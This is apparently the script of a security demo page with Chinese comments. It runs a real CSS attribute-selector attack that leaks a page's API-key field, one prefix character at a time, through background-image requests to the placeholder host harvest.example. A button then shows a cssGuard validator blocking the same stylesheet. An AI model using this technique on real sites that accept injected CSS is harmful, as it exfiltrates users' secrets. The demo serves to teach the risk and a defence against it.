"use strict";
/**
 * demo 页逻辑。
 *
 * 诚实性是这个 demo 唯一的价值：不模拟。攻击是真的 CSS，请求是浏览器真的发的，
 * "攻击者收到了什么"读自 Performance Resource Timing —— 也就是浏览器自己记录的、
 * 它确实发出去过的那些 URL。打开网络面板，你会看到同样的请求。
 *
 * 两条约束（都是踩出来的）：
 *   1. 每个前缀的 URL 带一个会话号，保证唯一。浏览器会把 404 按 URL 负缓存，
 *      同一个 URL 第二次不再请求；唯一化之后每个 URL 一生只请求一次，缓存不碍事。
 *   2. 一次只铺"已知前缀的下一位"，规则数恒定 = 字母表大小。一次把几百条属性
 *      选择器铺到有内容的页面上，浏览器要为每条做全文档匹配，会把渲染进程冻住。
 */

const $ = (id) => document.getElementById(id);

/** 探测这一个字段。API key 最能让人心里一紧。 */
const TARGET = { selector: 'input#apikey', attr: "value", param: "apikey", out: "out-apikey" };
const ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789-_.@";
const MAX_LEN = 16;

let session = Date.now();   // 每次页面加载唯一，避免撞上上一次会话被负缓存的 404 URL
let known = "";
let requests = 0;
let styleEl = null;
const logLines = [];
const seenUrls = new Set();

function buildRound() {
  if (known.length >= MAX_LEN) return "";
  const rules = [];
  for (const ch of ALPHABET) {
    const prefix = known + ch;
    rules.push(`${TARGET.selector}[${TARGET.attr}^="${prefix}"]{` +
               `background-image:url(https://harvest.example/x?s=${session}&${TARGET.param}=${encodeURIComponent(prefix)})}`);
  }
  return rules.join("\n");
}

function applyRound() {
  if (!styleEl) {
    styleEl = document.createElement("style");
    styleEl.id = "attack";
    document.head.appendChild(styleEl);
  }
  const next = buildRound();
  if (next !== styleEl.textContent) styleEl.textContent = next;
}

function stopAttack() {
  if (styleEl) { styleEl.remove(); styleEl = null; }
}

/**
 * 读 CSS 到底把你的秘密匹配到了哪一位。
 *
 * 攻击链是：属性选择器匹配当前值的前缀 -> 匹配就要画那张背景 -> 画背景就发一个
 * 带着这段前缀的请求。中间"匹配上了哪个前缀"这一步，getComputedStyle 直接读得到 ——
 * 它就是泄露本身。发出去的网络请求是"投递"，在真实的前台浏览器里照常发生
 * （打开网络面板能看到 collect/ 的请求），这里也照发；只是**不拿观测请求当驱动**，
 * 因为离屏/后台标签不 paint，背景图的网络加载会被推迟。读匹配结果则永远可靠。
 */
function probe() {
  const el = document.querySelector(TARGET.selector);
  if (!el || !styleEl) return;
  // 当前生效的背景图 URL —— 命中最长前缀的那条规则赢，url 里就带着那段前缀。
  const bg = getComputedStyle(el).backgroundImage;
  const m = bg.match(/harvest\.example\/x\?[^"')]*/);
  if (!m) return;
  const params = new URLSearchParams(m[0].split("?")[1] || "");
  const value = params.get(TARGET.param);
  if (value && value.length > known.length) {
    known = value;
    requests += 1;
    log(`matched: ${TARGET.param} starts with "${value}"`);
    applyRound();               // 铺下一位
    render();
  }
}
function watchRequests() {
  setInterval(probe, 120);      // 轮询匹配结果，稳，不依赖 paint
}

function log(line) {
  logLines.push(line);
  if (logLines.length > 200) logLines.shift();
  const box = $("log");
  box.textContent = logLines.join("\n");
  box.scrollTop = box.scrollHeight;
}

function render() {
  const el = $(TARGET.out);
  el.textContent = known || "—";
  el.classList.toggle("empty", !known);
  $("count").textContent = `${requests} requests`;
}

/* ── 接线 ─────────────────────────────────────────────────────────── */

$("toggle").addEventListener("change", (e) => {
  const on = e.target.checked;
  $("state").textContent = on ? "theme on — watch the API key field" : "theme off";
  if (!on) { stopAttack(); return; }
  session = Date.now(); known = ""; requests = 0; logLines.length = 0; seenUrls.clear();
  log("stylesheet applied…");
  // 背景图懒加载：目标不在视口就不取背景，攻击不发生。立即（非 smooth）滚进视口，
  // 滚定后再铺第一轮 —— smooth 是异步的，会在元素稳定前铺好，懒加载错过一次不再重试。
  $("try").scrollIntoView({ block: "center" });
  applyRound();                 // 直接铺，不靠 rAF —— rAF 在后台标签里根本不触发
});

$("mirror").addEventListener("change", (e) => {
  const input = $("apikey");
  if (e.target.checked) {
    const sync = () => { input.setAttribute("value", input.value); if (styleEl) applyRound(); };
    input.__sync = sync;
    input.addEventListener("input", sync);
    sync();
  } else if (input.__sync) {
    input.removeEventListener("input", input.__sync);
    input.__sync = null;
  }
});

$("check").addEventListener("click", () => {
  const css = buildRound() || `${TARGET.selector}[${TARGET.attr}^="s"]{background-image:url(https://harvest.example/x?=s)}`;
  const report = window.cssGuard.validateCss(css);
  const box = $("verdict");
  box.hidden = false;
  box.dataset.level = report.ok ? "ok" : "error";
  box.replaceChildren();

  const head = document.createElement("div");
  head.className = "headline";
  const strong = document.createElement("strong");
  strong.textContent = report.ok ? "Clean — nothing here reaches the network"
                                 : `Refused — ${report.errors} error${report.errors === 1 ? "" : "s"}`;
  const p = document.createElement("p");
  p.textContent = report.ok ? "This stylesheet is safe to inject."
                            : "An error is a block, not a warning. Nothing with an error is ever injected.";
  head.append(strong, p);
  box.appendChild(head);

  const seen = new Set();
  for (const f of report.findings) {
    if (seen.has(f.rule)) continue;
    seen.add(f.rule);
    const row = document.createElement("div");
    row.className = "finding";
    row.dataset.sev = f.severity;
    const h = document.createElement("div");
    h.className = "head";
    const sev = document.createElement("span");
    sev.className = "sev";
    sev.textContent = f.severity === "error" ? "blocked" : "warning";
    const msg = document.createElement("span");
    msg.textContent = f.message;
    const rule = document.createElement("span");
    rule.className = "rule";
    rule.textContent = f.rule;
    h.append(sev, msg, rule);
    const why = document.createElement("div");
    why.className = "why";
    why.textContent = f.why;
    row.append(h, why);
    box.appendChild(row);
  }
});

watchRequests();
render();
